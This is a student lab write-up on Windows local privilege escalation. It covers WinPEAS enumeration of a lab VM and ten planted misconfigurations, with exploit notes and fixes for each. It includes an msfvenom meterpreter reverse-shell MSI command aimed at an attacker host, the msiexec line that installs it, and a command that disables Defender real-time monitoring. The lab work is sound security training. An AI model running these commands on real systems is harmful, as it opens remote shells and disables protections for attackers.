# Windows Local Privilege Escalation
In this lab we will acheive the following objectives:

1. Run WinPEAS to enumerate a Windows 10 system for misconfigurations

2. Interpret WinPEAS output to identify privilege escalation vectors

3. Analyze common Windows privilege escalation paths

4. Understand remediation strategies for identified vulnerabilities

5. Exploit local privilege escalation vulnerabilities

### We will be using a Windows 10 VM (Target) and a Kali VM (Attacker)

#### Task 1: WinPEAS Enumeration

Notes on steps (input into claude for writeup)

ON KALI
Downloaded winpeas from kali vm ```git clone https://github.com/peass-ng/PEASS-ng.git```

Downloaded winlocalpriv_escalation.zip onto kali vm

started webserver to get winpeas to win10 vm ```python3 -m http.server 8000```

ON WINDOWS
```wget http://192.168.199.129:8000/winPEAS.ps1 -OutFile winPEAS.ps1```
<img width="638" height="328" alt="image" src="https://github.com/user-attachments/assets/c8c6867f-ae3e-4ee7-8709-dc376dff5d27" />


Now verify the file hash

KALI:
 
 <img width="665" height="83" alt="image" src="https://github.com/user-attachments/assets/794b8500-6284-45ff-9c83-3e521c556ff1" />

WINDOWS:
 
 <img width="832" height="95" alt="image" src="https://github.com/user-attachments/assets/a67db2f3-a14a-43af-a663-29db86d49e7d" />

Change execution policy:

<img width="996" height="126" alt="image" src="https://github.com/user-attachments/assets/23a02ae1-22cf-498e-8b47-c104387893e2" />

#### Screenshot Deliverables
Screenshot of WinPEAS banner and initial execution


<img width="1015" height="491" alt="image" src="https://github.com/user-attachments/assets/9f3b426e-5c0d-45c9-85a7-d9dba30b7a00" />

Screenshot of the color-coded output summary

Output file saved as winpeas_output_[yourname].txt

<img width="129" height="30" alt="image" src="https://github.com/user-attachments/assets/98bea954-6057-4ee4-886a-ae26fb35611c" />


Document the command(s) used to run WinPEAS in your Tech Journal
```.\winPEASx64.exe | Tee-Object -FilePath winpeas_output_yourname.txt```
#### Questions to Answer:
What hash algorithm does WinPEAS use for verification? What is the file hash?
I used sha256 to verify the file hash. Screenshot of file hash below:

<img width="665" height="83" alt="image" src="https://github.com/user-attachments/assets/1df9dc96-49b9-4491-98b3-f025e1f1771a" />


What does the RED/YELLOW/GREEN color coding indicate?
Red means that the finding is critical and has a clear privilege escalation path
Yellow means that the finding is a high-priority finding. You should look into this
Green means that the finding is most likely safe or typical

How long did the full scan take? What factors affect scan duration?

The scan took hours to finish, it always seemed to stop on the registry password check section where it stopped, though it didn't freeze or hang

Task 2
Downloaded the zip file to my kali machine, to get it to win10 machine used the same method as before

<img width="878" height="376" alt="image" src="https://github.com/user-attachments/assets/d54f0962-466c-4e11-b6ff-28168500a542" />

Tech Journal Submission
Document the bypass method.
I used ```Set-MpPreference -DisableRealtimeMonitoring $true``` to shut off microsoft defender

This Lab setup script injected 10 vulnerabilities into our windows vm. Below are the ten vulns documented and explained with the following guidelines:

- Document the 10 vulnerabilities to explain how it elevates privileges, with the specific weakness being exploited.

- Link(s) to resources that show how to exploit the vulnerabilities.

- Short summary on how to exploit each vulnerability.

- Short summary on how to fix each vulnerability.


1. Unquoted Service Path - VulnSvc

This vulnerability results from service paths containing spaces and no quotes.
For example, for the path C:\Program Files\Some Folder\Service.exe Windows will try to execute:
```
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
example from hacktricks.

To fix:

Open the Windows Registry Editor as an administrator.

Go to HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services.

Find the vulnerable service and look at the ImagePath value.

Add quotation marks around the path (change C:\Program Files\App\service.exe to "C:\Program Files\App\service.exe").

Then restart pc

https://isgovern.com/blog/how-to-fix-the-windows-unquoted-service-path-vulnerability/

https://hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html

2. AlwaysInstallElevated - HKLM + HKCU

Usually windows requires users to have admin rights to install systemwide installs. This setting, when enabled in both HKEY_LOCAL_MACHINE and HKEY_CURRENT_USER, allows any user to execute arbitrary code with elevated privileges by creating a malicious MSI installer.

One method to exploit:
```
# Generate malicious MSI
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o malicious.msi

# Transfer to target and install
msiexec /quiet /qn /i C:\temp\malicious.msi
```

To fix:
```
# Check if vulnerability exists
Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue
Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue
```

```
# Set to 0 or remove the values
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -Value 0
Set-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -Value 0

# Or remove completely
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue
Remove-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -ErrorAction SilentlyContinue
```
All examples from below source

https://docs.specterops.io/ghostpack-docs/SharpUp-mdx/checks/alwaysinstallelevated

3. Weak Service Permissions - WeakSvc

This vuln can take several forms though it basically means that a service can be modified in a way that a low-privileged user can take advantage of it. Exploits for this vuln can take numerous forms. An example is to overwrite a service's binary file or folder with a malicious one. You can find this vuln using commands like ```accesschk.exe``` ```icacls``` and ```sc.exe```
A couple fixes for this is to use least privilege frameworks and ensure that ACLs are configured and correct.

https://www.ired.team/offensive-security/privilege-escalation/weak-service-permissions

4. Weak Registry Permissions - RegSvc

This vuln is relatively similar to the last one with similar fixes. Exploiting this vuln takes a similar form as the last as well.

https://attack.mitre.org/techniques/T1574/011/

5. DLL Hijacking - DLLHijackSvc

This vuln is tricking a trusted app into loading a malicious DLL. Attacks using this vuln take many forms and it's a fairly broad category. One method is using DLL Search Order Hijacking, which is done by placing the malicious DLL in a search path ahead of the legitimate one, exploiting the application’s search pattern. Another method is Phantom DLL Hijacking which involves creating a malicious DLL for an application to load, thinking it’s a non-existent required DLL.

Fixes and Prevention Include:

 - EDR, Strict Directory Permissions
 - Safe DLL Search Order, Absolute Paths

https://hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dll-hijacking/index.html

6. Missing Service Binary - MissingBinSvc

This is another vuln that often falls under other categories like unqouted service path or weak permissions. This is due to the fact that exploiting it leverages the fact that there used to be a file that was being executed with elevated rights, but it was deleted or no longer exists. Attackers can exploit this by creating their own file and placing it in the same location to leverage the elevated permissions.
In order to fix this vuln you need to be careful to remove any orphaned or missing services. Also using absolute file paths can help to prevent it as well. 

7. Writable PATH Directory

This vulnerability happens when a system path environment variable has been modified to include a directory writable by unprivileged users. This is commonly caused when an application is installed outside of the appropriate directory (e.g. “Program Files”) and then the system path environment variable is modified to point to the installed directory. One of the more simple ways to exploit this vulnerability is to identify an application service running as NT AUTHORITYSYSTEM that attempts to load a non-existent DLL or attempts to execute a non-existent executable file. Since this file doesn’t exist on server operating systems, it will eventually traverse the system path, looking for the file. 
To fix this we can harden access controls used as well as audit current permissions.

https://www.praetorian.com/blog/red-team-local-privilege-escalation-writable-system-path-privilege-escalation-part-1/

8. Startup Folder Permissions

This vuln allows an attacker to place a file or program into the startup folder which will then be executed the next time the given user logs in. The escalation level will depend what permissions the targeted user has. The following are registry key and folder paths that can be used to achieve persistence, execute programs, and set up RATs:

The startup folder path for the current user is ```C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup```

The startup folder path for all users is ```C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp```

The following Registry keys can be used to set startup folder items for persistence:
```
    HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
    HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
```
The following Registry keys can control automatic startup of services during boot:
```
    HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
    HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
    HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices
    HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices
```
https://attack.mitre.org/techniques/T1547/001/

9. Unattend.xml with Credentials

Unattend.xml is a file used to automate Windows installs. Most deployments or situations where these files are used will have admin credentials, so an attacker who finds these files can easily steal them in order to escalate to an admin account. Some fixes are to harden Windows Deployment Services(WDS), delete all leftover files from post-Windows deployments, and scrub credentials.

https://support.microsoft.com/en-us/servicing/os/windows/2025/12/windows-deployment-services-wds-hands-free-deployment-hardening-guidance-related-to-cve-2026-0386

10. Scheduled Task - VulnScheduledTask

This vuln opens up opportunities for the attacker to both achieve privilege escalation and persistence. If an attacker can create a scheduled task then they can run malicious payloads with higher privileges and set recurring tasks to run malware. Additionally, this vuln can allow an attacker to hide the scheduled process. One method to exploit this vuln is to combine it with a search order hijacking attack on the built-in MareBackup process. This can then be abused by a low-privileged user to gain SYSTEM level privileges whenever a vulnerable folder is prepended to the system’s PATH environment variable instead of being appended. 
Commands to search for this vuln:
```
# Check the system PATH
Get-ItemProperty -Path "Registry::HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" -Name "Path" | Select-Object -ExpandProperty Path
# Check whether the scheduled task exists and is enabled
Get-ScheduledTask -TaskName "MareBackup"
# Enable the scheduled task if needed
Enable-ScheduledTask -TaskPath "\Microsoft\Windows\Application Experience" -TaskName "MareBackup"
# Start the scheduled task
Start-ScheduledTask -TaskPath "\Microsoft\Windows\Application Experience" -TaskName "MareBackup"
```
To fix scheduled task vulns in general:

- Ensure that the following registry key can only be modified by trusted admins
```HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree```

- Watch event logs and look for any potential unauthorized changes to registry keys associated with scheduled tasks

- Update Windows system

https://attack.mitre.org/techniques/T1053/005/
https://itm4n.github.io/hijacking-the-windows-marebackup-scheduled-task-for-privilege-escalation/

### Re-Run winPEAS
We will run winPEAS again in order to find the 10 vulns setup by our script. Each of the 10 vulns found will be documented below with screenshots:

1. Unquoted Service Path - VulnSvc

<img width="999" height="69" alt="image" src="https://github.com/user-attachments/assets/c049cbaa-dec2-4c41-8817-4209820d5117" />

2. AlwaysInstallElevated - HKLM + HKCU

<img width="1024" height="55" alt="image" src="https://github.com/user-attachments/assets/7178d460-69f9-4c67-842e-c4a3a8705b19" />

3. Weak Service Permissions - WeakSvc

<img width="993" height="60" alt="image" src="https://github.com/user-attachments/assets/857e5184-b424-4131-a6b2-16b477a08dc5" />

4. Weak Registry Permissions - RegSvc

<img width="1004" height="74" alt="image" src="https://github.com/user-attachments/assets/3586b7df-115f-4162-8ff6-efc01295872e" />

5. DLL Hijacking - DLLHijackSvc

<img width="993" height="57" alt="image" src="https://github.com/user-attachments/assets/52f15338-4e60-494e-8766-09f02f1ca650" />

6. Missing Service Binary - MissingBinSvc

<img width="993" height="58" alt="image" src="https://github.com/user-attachments/assets/bfde6369-6c49-42b0-b3c5-0810ebb48a54" />

7. Writable PATH Directory

<img width="1042" height="120" alt="image" src="https://github.com/user-attachments/assets/e685c734-5801-422d-ad03-ae209b7adcec" />


8. Startup Folder Permissions

<img width="984" height="87" alt="image" src="https://github.com/user-attachments/assets/202b4739-f9a9-430b-8ca2-9544fbcf20bd" />

9. Unattend.xml with Credentials

<img width="957" height="59" alt="image" src="https://github.com/user-attachments/assets/fdc6d700-a37e-4ca0-92ad-f3294310ff12" />

10. Scheduled Task - VulnScheduledTask
winPEAS was unable to locate this vuln in the scan I did. However, I manually searched for this vuln with the command ```schtasks /query /tn "VulnScheduledTask" /fo LIST /v``` this led to the task seen below:

<img width="651" height="467" alt="image" src="https://github.com/user-attachments/assets/a96eef6f-0846-4da2-8862-c0fcec9679be" />

Task 4

WeakSvc Exploit
https://youtu.be/L6jsYKpi2os









